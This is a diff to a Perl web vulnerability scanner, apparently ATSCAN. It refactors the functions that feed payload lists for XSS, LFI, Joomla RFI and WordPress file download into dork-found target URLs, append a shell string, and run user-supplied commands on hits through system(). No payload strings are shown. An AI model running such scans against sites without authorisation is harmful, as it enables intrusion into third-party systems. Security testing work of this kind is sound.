   $URL=checkUrlSchema($URL);	
   return $URL;
 }
@@ -699,13 +711,13 @@ sub control {
 ############################################################################################################################################################################################
 ## EXTRAT INFO PROCESS SCAN
 sub checkExtraInfo { 
-  my $URL=$_[0];
+  my $URL3=$_[0];
   if (!defined $port) {
     my %replace=( 'http://' => '', 'https://' => '', 'www.' => '', 'ftp://' => '', );
-    $URL=~s/$_/$replace{ $_}/g for keys %replace;
-    $URL=~s/\/.*//s;
+    $URL3=~s/$_/$replace{ $_}/g for keys %replace;
+    $URL3=~s/\/.*//s;
     use Socket;
-    my $ip=inet_aton($URL);
+    my $ip=inet_aton($URL3);
     print $c[1]."    $DS[10]      ";
     if ($ip) { my $address=inet_ntoa($ip); print $c[10]."$address\n"; }
     else{ print $c[10]."$DT[35]\n"; }
@@ -774,10 +786,8 @@ sub checkCmsType {
 sub checkErrors { 
   my $html=$_[0];
   my $ERROR=join("|", @ERR);
-  my $sp=" " x 11;
   if ($html=~/$ERROR/) {
-    my (@E1, @E2, @E3, @E4, @E5, @E6, @E7, @E8, @E9, @E10, @E11, @E12, @E13, @E14, @E15, @E16, @E17, @E18);
-    print $c[1]."    $ErrT[18] $c[4]$ErrT[24]\n"; 
+    my (@E1, @E2, @E3, @E4, @E5, @E6, @E7, @E8, @E9, @E10, @E11, @E12, @E13, @E14, @E15, @E16, @E17, @E18, @E19);
     for my $ERR(@ERR) {
       if ($html=~/$ERR/g) {
         if (grep( /^$ERR$/, @V_LFI)) { push(@E1, $ERR); }
@@ -800,26 +810,30 @@ sub checkErrors {
         if (grep( /^$ERR$/, @E_SHELL)) { push(@E18, $ERR); }
       }
     }
-    if (@E1) { print $c[1]."$sp $c[4]$ErrT[0] "; for my $E(@E1) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E2) { print $c[1]."$sp $c[4]$ErrT[1] "; for my $E(@E2) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E3) { print $c[1]."$sp $c[4]$ErrT[2] "; for my $E(@E3) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E4) { print $c[1]."$sp $c[4]$ErrT[3] "; for my $E(@E4) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E5) { print $c[1]."$sp $c[4]$ErrT[4] "; for my $E(@E5) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E6) { print $c[1]."$sp $c[4]$ErrT[5] "; for my $E(@E6) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E7) { print $c[1]."$sp $c[4]$ErrT[6] "; for my $E(@E7) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E8) { print $c[1]."$sp $c[4]$ErrT[7] "; for my $E(@E8) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E9) { print $c[1]."$sp $c[4]$ErrT[8] "; for my $E(@E9) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E10) { print $c[1]."$sp $c[4]$ErrT[9] "; for my $E(@E10) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E11) { print $c[1]."$sp $c[4]$ErrT[10] "; for my $E(@E11) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E12) { print $c[1]."$sp $c[4]$ErrT[11] "; for my $E(@E12) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E13) { print $c[1]."$sp $c[4]$ErrT[12] "; for my $E(@E13) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E14) { print $c[1]."$sp $c[4]$ErrT[13] "; for my $E(@E14) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E15) { print $c[1]."$sp $c[4]$ErrT[14] "; for my $E(@E15) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E16) { print $c[1]."$sp $c[4]$ErrT[15] "; for my $E(@E16) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E17) { print $c[1]."$sp $c[4]$ErrT[16] "; for my $E(@E17) { print $c[10]."[$E]"; } print "\n"; }
-    if (@E18) { print $c[1]."$sp $c[4]$ErrT[17] "; for my $E(@E18) { print $c[10]."[$E]"; } print "\n"; }
+    if (@E1) { for my $E(@E1) { printALLerrors($ErrT[0], $E); } }    
+    if (@E2) { for my $E(@E2) { printALLerrors($ErrT[1], $E); } }
+    if (@E3) { for my $E(@E3) { printALLerrors($ErrT[2], $E); } }
+    if (@E4) { for my $E(@E4) { printALLerrors($ErrT[3], $E); } }
+    if (@E5) { for my $E(@E5) { printALLerrors($ErrT[4], $E); } }
+    if (@E6) { for my $E(@E6) { printALLerrors($ErrT[5], $E); } }
+    if (@E7) { for my $E(@E7) { printALLerrors($ErrT[6], $E); } }
+    if (@E8) { for my $E(@E8) { printALLerrors($ErrT[7], $E); } }
+    if (@E9) { for my $E(@E9) { printALLerrors($ErrT[8], $E); } }
+    if (@E10) { for my $E(@E10) { printALLerrors($ErrT[9], $E); } }
+    if (@E11) { for my $E(@E11) { printALLerrors($ErrT[10], $E); } }
+    if (@E12) { for my $E(@E12) { printALLerrors($ErrT[11], $E); } }
+    if (@E13) { for my $E(@E13) { printALLerrors($ErrT[12], $E); } }
+    if (@E14) { for my $E(@E14) { printALLerrors($ErrT[13], $E); } }
+    if (@E15) { for my $E(@E15) { printALLerrors($ErrT[14], $E); } }
+    if (@E16) { for my $E(@E16) { printALLerrors($ErrT[15], $E); } }
+    if (@E17) { for my $E(@E17) { printALLerrors($ErrT[16], $E); } }
+    if (@E18) { for my $E(@E18) { printALLerrors($ErrT[17], $E); } }   
   }
 }
+############################################################################################################################################################################################
+############################################################################################################################################################################################
+## PRINT HTML ERRORS
+sub printALLerrors { my ($ErrT, $E)=@_; print $c[1]."    $ErrT[18] $c[4]$ErrT[24]\n".$c[1]."$sp $c[4]$ErrT ".$c[10]."[$E]"; print "\n"; }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## CHECK URL PARTS
@@ -1177,13 +1191,13 @@ sub doSearch {
 ## BROWSER PROCEDURE
 sub browseUrl {
   my ($URL1, $post)=@_;
-  my ($response, $html, $status, $serverheader)=getHtml($URL1, $post);
   if (defined $random) { newIdentity(); }
+  my ($response, $html, $status, $serverheader)=getHtml($URL1, $post);
   if (!defined $noinfo) { 
     if ($response->previous) { print $c[1]."    $DS[1]    $c[4]$DT[36]", $response->request->uri, "\n"; }    
-    print $c[1]."    $DS[3]    ". $c[10]."$DS[13] $status\n".$c[1]."    $DS[2]  ";
-    if (defined $serverheader) { print $c[10]."$serverheader \n"; }
-    else { print $c[10]."$DT[35]\n"; }
+    print $c[1]."    $DS[3]    ". $c[10]."$DS[13] $status\n"; print $c[1]."    $DS[2]  ";
+    if (defined $serverheader) { print $c[10]."$serverheader\n"; } 
+    else { print $c[10]."$DT[35]\n"; } 
     checkCms($html); checkErrors($html);
   }
   return ($response, $status, $html);
@@ -1214,16 +1228,19 @@ sub getHtml {
 ## GET SUBDOMAINES
 sub getSubDomaine { 
   my $URL1=$_[0];
+  $URL1=checkUrlSchema($URL1);
+  my ($response, $status, $html)=browseUrl($URL1, "");  
   $URL1=removeProtocol($URL1);
-  titleSCAN();
   my $socket=IO::Socket::INET->new( PeerAddr=>"$URL1", Proto=>'icmp', timeout=>1);
+  titleSCAN();
   if ((defined $socket)&&($socket ne "")) {
-    my $URL1=checkValidation($URL1, "", "$URL1", "", "");
-    if ($URL1) {
-      print $c[3]."$URL1";    
-      if (defined $beep) { print chr(7); } saveme($URL1); print "\n";
-      if (defined $pause) { ifirst(); }
-    }
+    if ($response->is_success) {
+      $URL1=checkValidation($URL1, $status, $html, $response, "");
+      if ($URL1) { print $c[3]."$URL1";    
+        if (defined $beep) { print chr(7); } saveme($URL1); print "\n";
+        if (defined $pause) { ifirst(); }
+      }
+    }else{ noResult(); }
   }else{ noResult(); }
 }
 ############################################################################################################################################################################################
@@ -1272,7 +1289,7 @@ sub getComnd {
     $comnd=~s/\-\-HOST/$URL1/g;
   }
   elsif ($comnd=~/\-TARGET/) { $comnd=~s/\-\-TARGET/$URL1/g; }
-  print $c[8]; system($comnd); print "\n";
+  stakScan(); print $c[8]; system($comnd); print "\n";
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
@@ -1344,7 +1361,7 @@ sub scanCode {
 ############################################################################################################################################################################################
 ## GET ALL PARAMS TO SCAN
 sub makeSscan { 
-  my ($at, $bt, $ct, $dt, $et, $ar, $v_ar, $title, $paylNote, $result, $reverse, $reg, $comnd, $isFilter, $post)=@_;
+  my ($at, $bt, $ct, $dt, $et, $ar, $v_ar, $title, $paylNote, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain)=@_;
   if (defined $proxy) { UA(); }
   checkHeaders($at, $bt, $ct, $dt, $et);  
   print $c[11]."$title"; scanTitleEnd(); title($title);
@@ -1364,17 +1381,17 @@ sub makeSscan {
     $URL=control($URL);
     if (!@arr) {     
       if (!$result) {
-        if (defined $exploit) { getExploitArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", $post);
+        if (defined $exploit) { getExploitArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", $post, "");
         }else{
           my $URL1=$URL; $URL1=~s/ //g;
-          if ($reg) { doScan($URL1, $filter, "", "", $reg, "", "", ""); }
-          elsif ($comnd) { doScan($URL1, $filter, "", "", "", $comnd, "", ""); }
-          elsif ($post) { doScan($URL1, $filter, "", "", "", "", "", $post); }
-          else{ doScan($URL1, $filter, "", "", "", "", "", ""); }
+          if ($reg) { doScan($URL1, $filter, "", "", $reg, "", "", "", ""); }
+          elsif ($comnd) { doScan($URL1, $filter, "", "", "", $comnd, "", "", ""); }
+          elsif ($post) { doScan($URL1, $filter, "", "", "", "", "", $post, ""); }
+          else{ doScan($URL1, $filter, "", "", "", "", $isFilter, "", ""); }
         }
       }else{
-        if (defined $exploit) { getExploitArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", $post); }
-        else{ my $URL1=$URL; $URL1=~s/ //g; doScan($URL1, $filter, $result, "", "", "", "", ""); }
+        if (defined $exploit) { getExploitArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", $post, ""); }
+        else{ my $URL1=$URL; $URL1=~s/ //g; doScan($URL1, $filter, $result, "", "", "", $isFilter, $post, ""); }
       }
     }else{
       my $pm=0;
@@ -1383,10 +1400,10 @@ sub makeSscan {
         points() if $pm>1; 
         print $c[1]."    $DS[5]  $c[10] [$pm/".scalar(grep { defined $_} @arr)."] $arr\n";
         if ((defined $exploit) || (defined $p)) {
-          getExploitArrScan($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, scalar(grep { defined $_} @arr), $post);
+          getExploitArrScan($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, scalar(grep { defined $_} @arr), $post, "");
         }else{
-          if ($reverse) { $URL=removeProtocol($URL); my $URL1=$arr.$URL; $URL1=~s/ //g; doScan($URL1, "", "", $reverse, "", "", $isFilter, $post); }
-          else{ my $URL1=$URL.$arr; $URL1=~s/ //g; doScan($URL1, $filter, "", "", "", "", $isFilter, $post); }
+          if ($reverse) { $URL=removeProtocol($URL); my $URL1=$arr.$URL; $URL1=~s/ //g; doScan($URL1, "", "", $reverse, "", "", $isFilter, $post, $subdomain); }
+          else{ my $URL1=$URL.$arr; $URL1.=$shell if defined $shell; $URL1=~s/ //g; doScan($URL1, $filter, "", "", "", "", $isFilter, $post, ""); }
         }
       }
     }points();
@@ -1408,7 +1425,7 @@ sub checkHeaders {
 ############################################################################################################################################################################################
 ## MAKE SCAN WITH EXPLOIT IN ARRAY
 sub getExploitArrScan{
-  my ($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, $post)=@_;
+  my ($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, $post, $subdomain)=@_;
   if (defined $exploit) {  
     my $lc=countAtexp();
     my $count3=0;
@@ -1418,24 +1435,24 @@ sub getExploitArrScan{
 	  $count3++;
       print $c[1]."    $DS[6]  $c[10] [$OTHERS[1] $count3/$lc][$exp]\n" if !defined $p;
       if (defined $p) {
-        if ($arr) { getPArrScan($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, $exp, $lc, $count3, $post); }
-        else{ getPArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", $exp, $lc, $count3, $post); }
+        if ($arr) { getPArrScan($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, $exp, $lc, $count3, $post, ""); }
+        else{ getPArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", $exp, $lc, $count3, $post, ""); }
       }else{
-        if ($arr) { my $URL1=$URL.$exp.$arr; $URL1=~s/ //g; doScan($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post); }
-       else{ my $URL1=$URL.$exp; $URL1=~s/ //g; doScan($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post); }
+        if ($arr) { my $URL1=$URL.$exp.$arr; $URL1.=$shell if defined $shell; $URL1=~s/ //g; doScan($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, ""); }
+       else{ my $URL1=$URL.$exp; $URL1=~s/ //g; doScan($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, ""); }
       }
     }
     close (EXP);
   }else{
-    if ($arr) { getPArrScan($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, "", "", "", $post); }
-    else{ getPArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", "", "", "", $post); }
+    if ($arr) { getPArrScan($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, "", "", "", $post, ""); }
+    else{ getPArrScan($URL, "", $filter, $result, $reverse, $reg, $comnd, $isFilter, "", "", "", "", "", $post, ""); }
   }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## MAKE SCAN WITH DEFINED PARAMETERS
 sub getPArrScan{
-  my ($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, $exp, $lc, $count3, $post)=@_;
+  my ($URL, $arr, $filter, $result, $reverse, $reg, $comnd, $isFilter, $pm, $pmarr, $exp, $lc, $count3, $post, $subdomain)=@_;
   if (defined $p) {
     my @P=split(",", $p);
     my $pc=0;
@@ -1446,6 +1463,7 @@ sub getPArrScan{
       print $c[1]."    $OTHERS[16]  $c[10] [$pc/".scalar(grep { defined $_} @P)."][$P]\n";
       if ($URL=~/$P/) {
         my $URL1=$URL;
+         $URL1.=$shell if defined $shell;
         if (index($URL, "?$P=") != -1) { $URL1=~s/\?$P=([^&]*)/\?$P=$1$exp$arr/g; doScan($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post); }
         if (index($URL, "&$P=") != -1) { $URL1=~s/\&$P=([^&]*)/\&$P=$1$exp$arr/g; doScan($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post); }       
       }else{ print $c[1]."    $DS[4]:   $c[2]$OTHERS[17]\n"; points(); }
@@ -1456,37 +1474,37 @@ sub getPArrScan{
 ############################################################################################################################################################################################
 ## MOVE URL TO SCAN
 sub doScan {
-  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post)=@_;
+  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain)=@_;
   my $n=0;
   my ($i, $sl, $rangQ);
   if ($URL1=~/rang\((\d+)\-(\d+)\)/) {
     my @rangQ=($1 .. $2);
     $URL1=~s/rang\((\d+)\-(\d+)\)/ ATSCAN /g;
-    for $rangQ(@rangQ) { $n++; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, scalar(grep { defined $_} @rangQ), $n, $post); }
+    for $rangQ(@rangQ) { $n++; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, scalar(grep { defined $_} @rangQ), $n, $post, $subdomain); }
   }elsif ($URL1=~/repeat\((.*)\-(\d+)\)/) {
     $URL1=~s/repeat\((.*)\-(\d+)\)/ ATSCAN /g;
-    for($i=1;$i<=$2;$i++) { $n++; $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n, $post); }
+    for($i=0;$i<=$2;$i++) { $n++; $sl="$1" x $i; doBuild($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $sl, $2, $n, $post, $subdomain); points();}
   }else{
-    buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post);
+    buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain);
   }
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## DO SCAN
 sub doBuild {
-  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, $nn, $n, $post)=@_;
+  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $rangQ, $nn, $n, $post, $subdomain)=@_;
   $URL1=~s/ ATSCAN /$rangQ/ig;
   my $PURL1=$URL1;
   print $c[1]."    URL    $c[10] [$n/$nn] $PURL1\n";
-  buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post);
+  buildPrint($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain);
   stak() if $nn==$n and !defined $exploit;
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## BUILD SCAN RESULTS LISTS
 sub buildPrint {
-  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post)=@_;
-  my ($response, $status, $html)=browseUrl($URL1, $post);
+  my ($URL1, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post, $subdomain)=@_;
+  my ($response, $status, $html)=browseUrl($URL1, $post) if !$subdomain;
   printResults($URL1, $response, $status, $html, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post);        
 }
 ############################################################################################################################################################################################
@@ -1502,16 +1520,17 @@ sub noResult { print $c[2]."$DT[1]\n"; }
 ## CHECK RESULTS TO SCAN
 sub printResults { 
   my ($URL1, $response, $status, $html, $filter, $result, $reverse, $reg, $comnd, $isFilter, $post)=@_;
-  titleSCAN() if ((($result) && (defined $Hstatus || defined $validText)) || ($post) || ($comnd));
   if ($result) { my $cV=checkValidation($URL1, $status, $html, $response, $result);
-    if ($cV) { doPrint($URL1, $result); }else{ noResult(); }
-  }elsif ($reverse) { getSubDomaine($URL1); }
+    titleSCAN() if $result && (defined $Hstatus || defined $validText);
+    if ($cV) { doPrint($URL1, $result); }else{ noResult(); } }
+  elsif ($reverse) { getSubDomaine($URL1); }
   elsif ($reg) { getRegex($URL1, $html, $reg); }
   elsif ($comnd) { my $cV=checkValidation($URL1, $status, $html, $response, "");
-    if ($cV) { stakScan(); getComnd($URL1, $comnd); }else{ noResult(); }
-  }elsif ($post) { my $cV=checkValidation($URL1, $status, $html, $response, "");
-    if ($cV) { doPrint($URL1, ""); }else{ stakScan(); print $c[8]."$html\n"; }
-  }else{ titleSCAN();
+    titleSCAN();
+    if ($cV) { getComnd($URL1, $comnd); }else{ noResult(); }
+  }elsif ($post) { titleSCAN(); postData($URL1, $html, $status, $response); 
+  }else{
+    titleSCAN();
     if ($isFilter) {
       if ($html=~/$filter/) {
         my $cV=checkValidation($URL1, $status, $html, $response, "");
@@ -1527,15 +1546,25 @@ sub printResults {
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
+## PRINT POST DATA RESULTS
+sub postData {
+  my ($URL1, $html, $status, $response)=@_;
+  if (defined $Hstatus or defined $validText) {
+    my $cV=checkValidation($URL1, $status, $html, $response, "");
+    if ($cV) { doPrint($URL1, ""); }else{ noResult(); }
+  }else{
+    stakScan(); print $c[8]."$html\n";
+  }
+}
+############################################################################################################################################################################################
+############################################################################################################################################################################################
 ## CHECK VALIDATION SEARCH RESULTS / TARGETS LIST
 sub checkValidation {
   my ($URL1, $status, $html, $response, $result)=@_;
   my $cV;
-  if (defined $Hstatus) {
-    if ($status==$Hstatus) { $cV=$URL1; }else{ $cV=""; }
-  }elsif (defined $validText) {
-    if ($html=~/$validText/) { $cV=$URL1; }else{ $cV=""; }
-  }else{ $cV=$URL1; }
+  if (defined $Hstatus) { if ($status==$Hstatus) { $cV=$URL1; }else{ $cV=""; } }
+  elsif (defined $validText) { if ($html=~/$validText/) { $cV=$URL1; }else{ $cV=""; } }
+  else{ $cV=$URL1; } 
   return $cV;
 }
 ############################################################################################################################################################################################
@@ -1551,9 +1580,7 @@ sub doPrint {
 ############################################################################################################################################################################################
 ## CHECK IF THERE MORE SCANS TO DO
 sub getK { 
-  my ($x, $y)=@_;  
-  my $k=0;
-  splice @z, $x, $y;
+  my ($x, $y)=@_; my $k=0; splice @z, $x, $y;
   for (@z) { if (defined $_) { $k++; } } return $k;
 }
 ############################################################################################################################################################################################
@@ -1618,7 +1645,7 @@ sub printSearch {
     checkDuplicate($aTsearch);
     my $k=getK(0, 0);
     if (!$k) {    
-      makeSscan("", "", "", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[0], "", "1", "", "", "", "", "");
+      makeSscan("", "", "", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[0], "", "1", "", "", "", "", "", "");
       if (defined $Hstatus or defined $validText) { doUnlink(); }
         my $lc=countAtsearch();
         stak();ltak(); print $c[3]."[!] $lc $DT[4]\n";
@@ -1632,69 +1659,69 @@ sub printSearch {
 ## EXTERN COMMAND
 sub mcommand {
   doUnlink();
-  makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[16], "", "", "", "", $command, "", "");
-  stak(); adios(); logoff();
+  makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[16], "", "", "", "", $command, "", "", "");
+  ltak(); adios(); logoff();
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## POST COMMAND
 sub mpost {
   doUnlink();
-  makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[23], "", "", "", "", "", "", $post);
-  stak(); adios(); logoff();
+  makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[23], "", "", "", "", "", "", "6", "");
+  ltak(); adios(); logoff();
 }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET WORDPRESS SITES
-sub WpSites { makeSscan("", "", "3", "", "", \@TODO, \@V_WP, $SCAN_TITLE[3], "", "", "", "", "", "", ""); my $k=getK(0, 3); endScan($k); }
+sub WpSites { makeSscan("", "", "3", "", "", \@TODO, \@V_WP, $SCAN_TITLE[3], "", "", "", "", "", "1", "", ""); my $k=getK(0, 3); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET WORDPRESS SITES
-sub JoomSites { makeSscan("", "", "3", "", "", \@TODO, \@V_JOOM, $SCAN_TITLE[4], "", "", "", "", "", "", ""); my $k=getK(0, 4); endScan($k); }
+sub JoomSites { makeSscan("", "", "3", "", "", \@TODO, \@V_JOOM, $SCAN_TITLE[4], "", "", "", "", "", "1", "", ""); my $k=getK(0, 4); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## XSS
-sub xss { makeSscan("", "", "3", "", "", \@XSS, \@V_XSS, $SCAN_TITLE[5], $paylNote, "", "", "", "", "1", ""); my $k=getK(0, 5); endScan($k); }
+sub xss { makeSscan("", "", "3", "", "", \@XSS, \@V_XSS, $SCAN_TITLE[5], $paylNote, "", "", "", "", "1", "", ""); my $k=getK(0, 5); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## LFI
-sub lfi { makeSscan("", "", "3", "4", "", \@LFI, \@V_LFI, $SCAN_TITLE[6], $paylNote, "", "", "", "", "", ""); my $k=getK(0, 6); endScan($k); }
+sub lfi { makeSscan("", "", "3", "", "", \@LFI, \@V_LFI, $SCAN_TITLE[6], $paylNote, "", "", "", "", "1", "", ""); my $k=getK(0, 6); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## RFI JOOMLA
-sub JoomRfi { makeSscan("", "", "3", "4", "", \@RFI, \@E_SHELL, $SCAN_TITLE[7], $paylNote, "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 7); endScan($k); }
+sub JoomRfi { makeSscan("", "", "3", "4", "", \@RFI, \@E_SHELL, $SCAN_TITLE[7], $paylNote, "", "", "", "", "1", "", ""); restaureSearch(); my $k=getK(0, 7); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## WORDPRESS ADF
-sub WpAfd { makeSscan("", "", "3", "4", "", \@ADFWP, \@V_AFD, $SCAN_TITLE[8], $paylNote, "", "", "", "", "1", ""); restaureSearch(); my $k=getK(0, 8); endScan($k); }
+sub WpAfd { makeSscan("", "", "3", "4", "", \@ADFWP, \@V_AFD, $SCAN_TITLE[8], $paylNote, "", "", "", "", "1", "", ""); restaureSearch(); my $k=getK(0, 8); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET ADMIN PAGE
-sub adminPage { makeSscan("", "", "3", "4", "", \@ADMIN, \@V_TODO, $SCAN_TITLE[9], $paylNote, "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 9); endScan($k); }
+sub adminPage { makeSscan("", "", "3", "4", "", \@ADMIN, \@V_TODO, $SCAN_TITLE[9], $paylNote, "", "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 9); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET SUBDOMAINS
-sub subdomain { makeSscan("", "", "3", "4", "5", \@SUBDOMAIN, \@V_TODO, $SCAN_TITLE[10], $paylNote, "", "1", "", "", "", ""); restaureSearch(); my $k=getK(0, 10); endScan($k); }
+sub subdomain { makeSscan("", "", "3", "4", "5", \@SUBDOMAIN, \@V_TODO, $SCAN_TITLE[10], $paylNote, "", "1", "", "", "", "", "7"); restaureSearch(); my $k=getK(0, 10); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET UPLOAD FILES
-sub uploadSites { makeSscan("", "", "3", "4", "", \@UPLOAD, \@V_TODO, $SCAN_TITLE[11], $paylNote, "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 11); endScan($k); }
+sub uploadSites { makeSscan("", "", "3", "4", "", \@UPLOAD, \@V_TODO, $SCAN_TITLE[11], $paylNote, "", "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 11); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET ZIP FILES
-sub zipSites { makeSscan("", "", "3", "4", "", \@ZIP, \@V_TODO, $SCAN_TITLE[12], $paylNote, "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 12); endScan($k); }
+sub zipSites { makeSscan("", "", "3", "4", "", \@ZIP, \@V_TODO, $SCAN_TITLE[12], $paylNote, "", "", "", "", "", "", ""); restaureSearch(); my $k=getK(0, 12); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET IPS
-sub Ips { makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[21], "", "", "", $V_IP, "", "", ""); my $k=getK(0, 13); endScan($k); }
+sub Ips { makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[21], "", "", "", $V_IP, "", "", "", ""); my $k=getK(0, 13); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET E-MAILS
-sub eMails { makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[13], "", "", "", $V_EMAIL, "", "", ""); my $k=getK(0, 14); endScan($k); }
+sub eMails { makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[13], "", "", "", $V_EMAIL, "", "", "", ""); my $k=getK(0, 14); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET REGEX
-sub Regex { makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[22], "", "", "", $V_REGEX, "", "", ""); my $k=getK(0, 15); endScan($k); }
+sub Regex { makeSscan("", "", "3", "", "", \@TODO, \@V_TODO, $SCAN_TITLE[22], "", "", "", $V_REGEX, "", "", "", ""); my $k=getK(0, 15); endScan($k); }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## GET OPEN PORTS
@@ -1778,7 +1805,7 @@ if ((defined $dork) || (defined $Target)) {
   if ((defined $replace)&&(!defined $with)) { desclaimer(); print $c[2]."[!] $DT[22]\n"; logoff(); }
 }
 if ((!defined $dork) && ((defined $unique) || (defined $ifinurl))) { desclaimer(); print $c[2]."[!] $DT[21]\n"; logoff(); }
-if (defined $regex or defined $eMails or defined $subdomain or defined $searchRegex or defined $searchIps) { if (defined $Hstatus) { print $c[2]."[!] $SCAN_TITLE[2]"; logoff(); } }
+if (defined $regex or defined $eMails or defined $searchRegex or defined $searchIps) { if (defined $Hstatus) { print $c[2]."[!] $SCAN_TITLE[2]"; logoff(); } }
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
 ## PRINT INFO MENU
@@ -1790,8 +1817,7 @@ if (defined $motor) {
   if ($motor!~/1|2|3|4|5|all/) { 
     desclaimer();      
     print $c[2]."[!] "; timer();
-    print "$DT[25]\n";    
-    print $c[4]."   $DT[27] \n    $OTHERS[5] -m [1,2,...]\n"; logoff();
+    print "$DT[25]\n".$c[4]."   $DT[27] \n   $OTHERS[5] -m 1,2,...\n"; logoff();
   }
 }
 ############################################################################################################################################################################################
@@ -1799,9 +1825,8 @@ if (defined $motor) {
 #######  SCANS ARGUMENTS
 ############################################################################################################################################################################################
 ############################################################################################################################################################################################
